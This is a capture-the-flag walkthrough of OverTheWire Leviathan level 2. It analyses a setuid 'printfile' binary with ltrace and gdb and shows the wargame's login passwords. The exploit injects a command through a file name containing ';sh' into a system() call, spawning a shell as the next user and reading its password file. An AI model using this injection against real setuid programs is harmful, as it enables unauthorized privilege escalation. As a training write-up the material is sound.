# Level 2
## Connection
~~~~
$ ssh leviathan2@leviathan.labs.overthewire.org -p 2223
Password: ougahZi8Ta
~~~~

## Solution
### Access the password file directly
Unfortunately, we are not allowed to access the password:
~~~~
$ cat /etc/leviathan_pass/leviathan3
cat: /etc/leviathan_pass/leviathan3: Permission denied
~~~~
### Run the printfile executable
There is an executable in our `home`:
~~~~
leviathan2@leviathan:~$ ls -la
total 28
drwxr-xr-x  2 root       root       4096 Aug 26  2019 .
drwxr-xr-x 10 root       root       4096 Aug 26  2019 ..
-rw-r--r--  1 root       root        220 May 15  2017 .bash_logout
-rw-r--r--  1 root       root       3526 May 15  2017 .bashrc
-r-sr-x---  1 leviathan3 leviathan2 7436 Aug 26  2019 printfile
-rw-r--r--  1 root       root        675 May 15  2017 .profile
leviathan2@leviathan:~$ file printfile 
printfile: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=46891a094764828605a00c0c38abfccbe4b46548, not stripped
~~~~

Let's use `ltrace` to see what happens:
~~~~
leviathan2@leviathan:~$ ltrace ./printfile /etc/leviathan_pass/leviathan3
__libc_start_main(0x804852b, 2, 0xffffd764, 0x8048610 <unfinished ...>
access("/etc/leviathan_pass/leviathan3", 4)      = -1
puts("You cant have that file..."You cant have that file...
)               = 27
+++ exited (status 1) +++
~~~~

We see a call to the `access` function. If you type `man access`, you will read the following explanation:
~~~~
The mode specifies the accessibility check(s) to be performed,  and  is
either the value F_OK, or a mask consisting of the bitwise OR of one or
more of R_OK, W_OK, and X_OK.  F_OK tests  for  the  existence  of  the
file.   R_OK,  W_OK,  and  X_OK test whether the file exists and grants
read, write, and execute permissions, respectively.

The check is done using the calling process's real UID and GID,  rather
than the effective IDs as is done when actually attempting an operation
(e.g., open(2)) on the file.  Similarly, for the root user,  the  check
uses the set of permitted capabilities rather than the set of effective
capabilities; and for non-root users, the check uses an  empty  set  of
capabilities.
~~~~

### gdb
I tried to debug the executable in gdb to modify the return of the `access` function and modify the workflow but it also failed to read the password file:
~~~~
$ gdb -q ./printfile
(gdb) set disassembly-flavor intel
(gdb) disassemble main
Dump of assembler code for function main:
   0x0804852b <+0>:	lea    ecx,[esp+0x4]
   0x0804852f <+4>:	and    esp,0xfffffff0
   0x08048532 <+7>:	push   DWORD PTR [ecx-0x4]
   0x08048535 <+10>:	push   ebp
   0x08048536 <+11>:	mov    ebp,esp
   0x08048538 <+13>:	push   ebx
   0x08048539 <+14>:	push   ecx
   0x0804853a <+15>:	sub    esp,0x200
   0x08048540 <+21>:	mov    ebx,ecx
   0x08048542 <+23>:	cmp    DWORD PTR [ebx],0x1
   0x08048545 <+26>:	jg     0x8048577 <main+76>
   0x08048547 <+28>:	sub    esp,0xc
   0x0804854a <+31>:	push   0x8048690
   0x0804854f <+36>:	call   0x80483c0 <puts@plt>
   0x08048554 <+41>:	add    esp,0x10
   0x08048557 <+44>:	mov    eax,DWORD PTR [ebx+0x4]
   0x0804855a <+47>:	mov    eax,DWORD PTR [eax]
   0x0804855c <+49>:	sub    esp,0x8
   0x0804855f <+52>:	push   eax
   0x08048560 <+53>:	push   0x80486a5
   0x08048565 <+58>:	call   0x80483a0 <printf@plt>
   0x0804856a <+63>:	add    esp,0x10
   0x0804856d <+66>:	mov    eax,0xffffffff
   0x08048572 <+71>:	jmp    0x80485fa <main+207>
   0x08048577 <+76>:	mov    eax,DWORD PTR [ebx+0x4]
   0x0804857a <+79>:	add    eax,0x4
   0x0804857d <+82>:	mov    eax,DWORD PTR [eax]
   0x0804857f <+84>:	sub    esp,0x8
   0x08048582 <+87>:	push   0x4
   0x08048584 <+89>:	push   eax
   0x08048585 <+90>:	call   0x8048410 <access@plt>
   0x0804858a <+95>:	add    esp,0x10
   0x0804858d <+98>:	test   eax,eax
   0x0804858f <+100>:	je     0x80485a8 <main+125>
   0x08048591 <+102>:	sub    esp,0xc
   0x08048594 <+105>:	push   0x80486b9
   0x08048599 <+110>:	call   0x80483c0 <puts@plt>
   0x0804859e <+115>:	add    esp,0x10
   0x080485a1 <+118>:	mov    eax,0x1
   0x080485a6 <+123>:	jmp    0x80485fa <main+207>
   0x080485a8 <+125>:	mov    eax,DWORD PTR [ebx+0x4]
   0x080485ab <+128>:	add    eax,0x4
   0x080485ae <+131>:	mov    eax,DWORD PTR [eax]
   0x080485b0 <+133>:	push   eax
   0x080485b1 <+134>:	push   0x80486d4
   0x080485b6 <+139>:	push   0x1ff
   0x080485bb <+144>:	lea    eax,[ebp-0x208]
   0x080485c1 <+150>:	push   eax
   0x080485c2 <+151>:	call   0x8048400 <snprintf@plt>
   0x080485c7 <+156>:	add    esp,0x10
   0x080485ca <+159>:	call   0x80483b0 <geteuid@plt>
   0x080485cf <+164>:	mov    ebx,eax
   0x080485d1 <+166>:	call   0x80483b0 <geteuid@plt>
---Type <return> to continue, or q <return> to quit---
   0x080485d6 <+171>:	sub    esp,0x8
   0x080485d9 <+174>:	push   ebx
   0x080485da <+175>:	push   eax
   0x080485db <+176>:	call   0x80483e0 <setreuid@plt>
   0x080485e0 <+181>:	add    esp,0x10
   0x080485e3 <+184>:	sub    esp,0xc
   0x080485e6 <+187>:	lea    eax,[ebp-0x208]
   0x080485ec <+193>:	push   eax
   0x080485ed <+194>:	call   0x80483d0 <system@plt>
   0x080485f2 <+199>:	add    esp,0x10
   0x080485f5 <+202>:	mov    eax,0x0
   0x080485fa <+207>:	lea    esp,[ebp-0x8]
   0x080485fd <+210>:	pop    ecx
   0x080485fe <+211>:	pop    ebx
   0x080485ff <+212>:	pop    ebp
   0x08048600 <+213>:	lea    esp,[ecx-0x4]
   0x08048603 <+216>:	ret    
End of assembler dump.
(gdb) b *0x0804858d
Breakpoint 1 at 0x804858d
(gdb) r /etc/leviathan_pass/leviathan3
Starting program: /home/leviathan2/printfile /etc/leviathan_pass/leviathan3

Breakpoint 1, 0x0804858d in main ()
(gdb) info reg eax
eax            0xffffffff	-1
(gdb) set $eax=0
(gdb) c
Continuing.
/bin/cat: /etc/leviathan_pass/leviathan3: Permission denied
[Inferior 1 (process 12567) exited normally]
(gdb) q
~~~~

### Vulnerability and Exploitation
Now, what is interesting here is that the program is actually building a string that concatenates `/bin/cat` with the argument passed to the program, and executes it at `0x80485ED` with a call to `system`:
```asm
.text:080485A8 loc_80485A8:                            ; CODE XREF: main+64↑j
.text:080485A8                 mov     eax, [ebx+4]
.text:080485AB                 add     eax, 4
.text:080485AE                 mov     eax, [eax]
.text:080485B0                 push    eax
.text:080485B1                 push    offset aBinCatS        ; "/bin/cat %s"
.text:080485B6                 push    1FFh
.text:080485BB                 lea     eax, [ebp+arg_file]
.text:080485C1                 push    eax
.text:080485C2                 call    _snprintf              ; concatenates "/bin/cat" with arg
.text:080485C7                 add     esp, 10h
.text:080485CA                 call    _geteuid
.text:080485CF                 mov     ebx, eax
.text:080485D1                 call    _geteuid
.text:080485D6                 sub     esp, 8
.text:080485D9                 push    ebx
.text:080485DA                 push    eax
.text:080485DB                 call    _setreuid
.text:080485E0                 add     esp, 10h
.text:080485E3                 sub     esp, 0Ch
.text:080485E6                 lea     eax, [ebp+arg_file]
.text:080485EC                 push    eax
.text:080485ED                 call    _system                 ; executes string
```

As the user input passed as argument is not sanitized, it is possible to inject commands.

Let's create a file that will be named `x;sh` in the `/tmp` directory and let's call this file.
~~~~
$ mkdir /tmp/azerty/
$ touch "/tmp/azerty/x;sh"
$ ./printfile "/tmp/azerty/x;sh"
/bin/cat: /tmp/azerty/x: No such file or directory
$ whoami   <==== *from here, this is the shell spawned by the printfile exe*
leviathan3
$ cat /etc/leviathan_pass/leviathan3
Ahdiemoo1j
~~~~

# Flag
~~~~
leviathan3:Ahdiemoo1j
~~~~
